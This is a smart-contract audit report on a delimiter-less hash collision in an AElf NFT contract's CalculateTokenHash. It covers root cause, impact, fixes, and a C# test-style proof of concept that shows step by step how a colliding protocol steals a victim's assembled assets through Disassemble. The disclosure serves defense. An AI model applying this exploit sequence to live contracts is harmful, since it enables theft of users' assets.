# Audit Report

## Title
Hash Collision Vulnerability in NFT Contract Allows Cross-Protocol Data Corruption and Asset Theft

## Summary
The NFT contract's `CalculateTokenHash` function uses naive string concatenation before hashing, enabling attackers to create malicious NFT protocols with symbols that produce identical token hashes as legitimate NFTs. This hash collision leads to state corruption across critical storage maps, allowing asset theft through the `Disassemble` function and denial-of-service attacks.

## Finding Description

The vulnerability originates from the `CalculateTokenHash` implementation that concatenates symbol and tokenId as strings before hashing: [1](#0-0) 

This creates ambiguous hash inputs where different (symbol, tokenId) pairs produce identical strings before hashing:
- Protocol "XX12345678" with TokenId 91 → "XX1234567891"  
- Protocol "XX123456789" with TokenId 1 → "XX1234567891"

The NFT contract's normal `Create` method generates symbols with a 2-character prefix followed by at least a 9-digit number, resulting in minimum 11-character symbols: [2](#0-1) [3](#0-2) 

However, the TokenContract allows regular tokens with symbols up to 10 characters: [4](#0-3) 

The critical flaw is that `CrossChainCreate` accepts any symbol already existing in TokenContract without length validation and has no authorization checks: [5](#0-4) 

During minting, when `IsTokenIdReuse=true`, the collision detection check is bypassed: [6](#0-5) 

When a collision occurs with `IsTokenIdReuse=true`, the existing NFT's data is modified rather than rejected, adding the attacker as a minter: [7](#0-6) 

The collision affects multiple critical state maps all indexed by the same tokenHash: [8](#0-7) [9](#0-8) [10](#0-9) [11](#0-10) 

## Impact Explanation

**Critical Impact - Asset Theft via Disassemble:**

The most severe impact occurs through the `Disassemble` function. When a hash collision exists, an attacker can call `Disassemble` with their colliding (symbol, tokenId) pair to steal the victim's assembled NFT/FT components: [12](#0-11) 

The function calculates the same tokenHash, retrieves the victim's assembled assets from the shared state maps, and transfers them to the attacker. Since the attacker gained minter status when minting their colliding NFT, they can successfully burn it and retrieve the victim's assets.

**Secondary Impacts:**

1. **NFT Metadata Corruption**: When the attacker mints with `IsTokenIdReuse=true`, the victim's NFTInfo quantity and minters list are modified, corrupting protocol integrity.

2. **Balance Map Sharing**: Multiple protocols share the same balance entry, allowing unauthorized balance manipulation through transfers.

3. **Allowance Map Exploitation**: Allowances set for one protocol affect another protocol sharing the hash.

4. **Denial of Service**: If the attacker mints first, legitimate protocols with `IsTokenIdReuse=false` (the default for NFTs) cannot mint their intended tokenIds.

## Likelihood Explanation

**High Likelihood:**

1. **Public Attack Surface**: The `CrossChainCreate` method has no authorization checks, making it callable by anyone.

2. **Low Attack Cost**: Attackers only need to acquire a SEED NFT (available through market purchase) to create tokens: [13](#0-12) 

3. **Attacker Control**: The attacker controls the token's ExternalInfo during creation, allowing them to set `IsTokenIdReuse=true` to bypass collision detection.

4. **Deterministic Exploitation**: Hash calculation is deterministic, enabling precise targeting of victim NFT protocols by calculating which (symbol, tokenId) pairs produce desired collisions.

5. **No On-Chain Detection**: Hash collisions appear as normal NFT operations with no obvious indicators, making detection difficult.

## Recommendation

Implement the following fixes:

1. **Add Symbol Length Validation in CrossChainCreate**: Enforce minimum symbol length (11 characters) to prevent short symbols that can collide:

```csharp
public override Empty CrossChainCreate(CrossChainCreateInput input)
{
    // Add length validation
    Assert(input.Symbol.Length >= 11, "Invalid symbol length for NFT protocol.");
    
    // Rest of existing logic...
}
```

2. **Use Delimiter in Hash Calculation**: Modify `CalculateTokenHash` to include a delimiter that prevents ambiguous concatenation:

```csharp
private Hash CalculateTokenHash(string symbol, long tokenId)
{
    return HashHelper.ComputeFrom($"{symbol}|{tokenId}");
}
```

3. **Add Authorization to CrossChainCreate**: Restrict who can call `CrossChainCreate` or add additional validation checks.

4. **Prevent Collision Exploitation**: Even with `IsTokenIdReuse=true`, check if the existing NFT belongs to a different protocol and reject the mint.

## Proof of Concept

```csharp
[Fact]
public async Task HashCollisionAttackTest()
{
    // 1. Attacker creates token with 10-char symbol and IsTokenIdReuse=true
    var attackerSymbol = "XX12345678";
    var attackerSeedNft = await CreateSeedNftForSymbol(attackerSymbol);
    
    var createInput = new CreateInput
    {
        Symbol = attackerSymbol,
        TokenName = "Malicious Token",
        TotalSupply = 1000000,
        Issuer = AttackerAddress,
        IsBurnable = true,
        ExternalInfo = new ExternalInfo
        {
            Value =
            {
                ["aelf_nft_base_uri"] = "https://attacker.com/",
                ["aelf_nft_token_id_reuse"] = "true",
                ["aelf_nft_type"] = "Any"
            }
        }
    };
    await TokenContractStub.Create.SendAsync(createInput);
    
    // 2. Attacker registers as NFT protocol via CrossChainCreate
    await NftContractStub.CrossChainCreate.SendAsync(new CrossChainCreateInput
    {
        Symbol = attackerSymbol
    });
    
    // 3. Victim has legitimate NFT protocol with 11-char symbol
    var victimSymbol = "XX123456789";
    await CreateLegitimateNftProtocol(victimSymbol);
    
    // 4. Victim mints and assembles NFT with tokenId=1
    var victimTokenId = 1;
    await NftContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = victimSymbol,
        TokenId = victimTokenId,
        Quantity = 1
    });
    
    var valuableAssets = new AssembledNfts();
    // Add valuable NFTs...
    await NftContractStub.Assemble.SendAsync(new AssembleInput
    {
        Symbol = victimSymbol,
        TokenId = victimTokenId,
        AssembledNfts = valuableAssets
    });
    
    // 5. Attacker mints colliding NFT with tokenId=91
    var attackerTokenId = 91;
    await NftContractStub.Mint.SendAsync(new MintInput
    {
        Symbol = attackerSymbol,
        TokenId = attackerTokenId,
        Quantity = 1
    });
    
    // 6. Verify hash collision
    var victimHash = await NftContractStub.CalculateTokenHash.CallAsync(
        new CalculateTokenHashInput { Symbol = victimSymbol, TokenId = victimTokenId });
    var attackerHash = await NftContractStub.CalculateTokenHash.CallAsync(
        new CalculateTokenHashInput { Symbol = attackerSymbol, TokenId = attackerTokenId });
    
    victimHash.ShouldBe(attackerHash); // Collision confirmed
    
    // 7. Attacker steals victim's assets via Disassemble
    var balanceBefore = await GetAttackerBalanceOfValuableAssets();
    
    await NftContractStub.Disassemble.SendAsync(new DisassembleInput
    {
        Symbol = attackerSymbol,
        TokenId = attackerTokenId
    });
    
    var balanceAfter = await GetAttackerBalanceOfValuableAssets();
    balanceAfter.ShouldBeGreaterThan(balanceBefore); // Assets stolen
}
```

## Notes

This vulnerability breaks fundamental NFT protocol isolation guarantees. The root cause is the combination of:
1. Naive hash calculation without proper delimiters
2. Missing symbol length validation in `CrossChainCreate`
3. `IsTokenIdReuse` flag allowing modification of existing NFT state

The attack requires only publicly accessible methods and a SEED NFT, making it highly practical. The impact is severe as it enables direct theft of assembled assets and corruption of NFT metadata across different protocols.

### Citations

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L191-236)
```csharp
    public override Empty Disassemble(DisassembleInput input)
    {
        Burn(new BurnInput
        {
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            Amount = 1
        });

        var receiver = input.Owner ?? Context.Sender;

        var tokenHash = CalculateTokenHash(input.Symbol, input.TokenId);
        var assembledNfts = State.AssembledNftsMap[tokenHash].Clone();
        if (assembledNfts != null)
        {
            var nfts = assembledNfts;
            foreach (var pair in nfts.Value) DoTransfer(Hash.LoadFromHex(pair.Key), Context.Self, receiver, pair.Value);

            State.AssembledNftsMap.Remove(tokenHash);
        }

        var assembledFts = State.AssembledFtsMap[tokenHash].Clone();
        if (assembledFts != null)
        {
            var fts = assembledFts;
            foreach (var pair in fts.Value)
                State.TokenContract.Transfer.Send(new MultiToken.TransferInput
                {
                    Symbol = pair.Key,
                    Amount = pair.Value,
                    To = receiver
                });

            State.AssembledFtsMap.Remove(tokenHash);
        }

        Context.Fire(new Disassembled
        {
            Symbol = input.Symbol,
            TokenId = input.TokenId,
            DisassembledNfts = assembledNfts ?? new AssembledNfts(),
            DisassembledFts = assembledFts ?? new AssembledFts()
        });

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L330-333)
```csharp
    private Hash CalculateTokenHash(string symbol, long tokenId)
    {
        return HashHelper.ComputeFrom($"{symbol}{tokenId}");
    }
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L395-396)
```csharp
        if (!protocolInfo.IsTokenIdReuse || isTokenIdMustBeUnique)
            Assert(nftInfo == null, $"Token id {tokenId} already exists. Please assign a different token id.");
```

**File:** contract/AElf.Contracts.NFT/NFTContract_UseChain.cs (L433-437)
```csharp
        else
        {
            nftInfo.Quantity = nftInfo.Quantity.Add(quantity);
            if (!nftInfo.Minters.Contains(Context.Sender)) nftInfo.Minters.Add(Context.Sender);
        }
```

**File:** contract/AElf.Contracts.NFT/NFTContractConstants.cs (L5-5)
```csharp
    private const int NumberMinLength = 9;
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Helpers.cs (L36-36)
```csharp
        return $"{shortName}{randomNumber}";
```

**File:** contract/AElf.Contracts.MultiToken/TokenContractConstants.cs (L7-7)
```csharp
    public const int SymbolMaxLength = 10;
```

**File:** contract/AElf.Contracts.NFT/NFTContract_Create.cs (L75-86)
```csharp
    public override Empty CrossChainCreate(CrossChainCreateInput input)
    {
        MakeSureTokenContractAddressSet();
        InitialNFTTypeNameMap();
        Assert(State.NftProtocolMap[input.Symbol] == null, $"Protocol {input.Symbol} already created.");
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(new GetTokenInfoInput
        {
            Symbol = input.Symbol
        });
        if (string.IsNullOrEmpty(tokenInfo.Symbol))
            throw new AssertionException($"Token info {input.Symbol} not exists.");

```

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L17-17)
```csharp
    public MappedState<Hash, NFTInfo> NftInfoMap { get; set; }
```

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L22-22)
```csharp
    public MappedState<Hash, Address, long> BalanceMap { get; set; }
```

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L30-30)
```csharp
    public MappedState<Hash, Address, Address, long> AllowanceMap { get; set; }
```

**File:** contract/AElf.Contracts.NFT/NFTContractState.cs (L32-33)
```csharp
    public MappedState<Hash, AssembledNfts> AssembledNftsMap { get; set; }
    public MappedState<Hash, AssembledFts> AssembledFtsMap { get; set; }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L56-65)
```csharp
            if (!IsAddressInCreateWhiteList(Context.Sender) &&
                input.Symbol != TokenContractConstants.SeedCollectionSymbol)
            {
                var symbolSeed = State.SymbolSeedMap[input.Symbol.ToUpper()];
                CheckSeedNFT(symbolSeed, input.Symbol);
                // seed nft for one-time use only
                long balance = State.Balances[Context.Sender][symbolSeed];
                DoTransferFrom(Context.Sender, Context.Self, Context.Self, symbolSeed, balance, "");
                Burn(Context.Self, symbolSeed, balance);
            }
```
